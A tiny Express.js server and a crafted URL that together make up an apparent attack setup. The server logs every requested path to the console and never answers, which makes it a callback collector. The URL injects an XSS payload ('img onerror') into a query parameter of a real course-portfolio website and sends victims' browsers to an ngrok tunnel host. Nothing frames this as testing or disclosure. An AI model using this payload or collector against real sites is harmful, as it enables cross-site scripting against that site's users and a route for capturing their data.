import express from "express";
import path from "path";
const app = express();
let port = process.env.PORT || 3000;

// app.use(express.static("public"));
// app.get("*", (req, res) => res.sendFile(path.resolve("public", "index.html")));

app.get("/:path", (req, res) => {
  console.log(req.params.path);
});

app.listen(port, () => {
  console.log(`App listening at http://localhost:${port}`);
});

https://www.mycourseville.com/?q=courseville/course/32201/portfolio-%3Cimg%20src=x%20onerror=this.src=%27a865-2405-9800-b640-cd49-3c90-3ec-421f-965e.ngrok-free.app%27/